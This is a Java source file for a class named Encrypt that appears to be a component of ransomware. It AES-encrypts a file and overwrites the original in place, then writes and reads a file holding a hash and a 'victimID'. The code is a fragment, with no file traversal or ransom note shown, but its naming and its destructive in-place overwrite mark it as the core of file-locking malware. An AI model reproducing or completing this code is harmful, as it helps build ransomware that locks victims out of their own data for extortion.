import java.io.*;
import java.util.*;
import java.security.*;
import java.io.File;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
public class Encrypt
{
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES";

    private static String hash;
    private static String IDString;
    public static String getHash()
    {
        return hash;
    }

    public static int getID()
    {
        int ID = Integer.parseInt(IDString);
        return ID;
    }

    public static void doCrypto(int cipherMode, byte[] key, File inputFile) 
    throws NoSuchAlgorithmException, NoSuchPaddingException, FileNotFoundException, 
    InvalidKeyException, IOException, IllegalBlockSizeException, BadPaddingException {
        Key secretKey = new SecretKeySpec(key, ALGORITHM);
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(cipherMode, secretKey);
        String name = inputFile.getName();

        System.out.println(name + " encrypted");
        FileInputStream inputStream = new FileInputStream(inputFile);
        byte[] inputBytes = new byte[(int) inputFile.length()];

        inputStream.read(inputBytes);

        byte[] outputBytes = cipher.doFinal(inputBytes);

        FileOutputStream outputStream = new FileOutputStream(inputFile);
        outputStream.write(outputBytes);

        inputStream.close();
        outputStream.close();

    }

    public static void writeHashFile(String dir, String hash, int victimID) throws FileNotFoundException,IOException
    {
        File fout = new File(dir);
        FileOutputStream fos = new FileOutputStream(fout);

        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(fos));

        bw.write(hash);
        bw.newLine();
        bw.write(String.valueOf(victimID));
        bw.close();
    }

    public static void readHash(String dir)throws IOException {
        BufferedReader br = new BufferedReader(new FileReader(dir));
        try {
            StringBuilder sb = new StringBuilder();
            hash = br.readLine();       
            IDString = br.readLine();

           
        } finally {
            br.close();
        }

    }
}
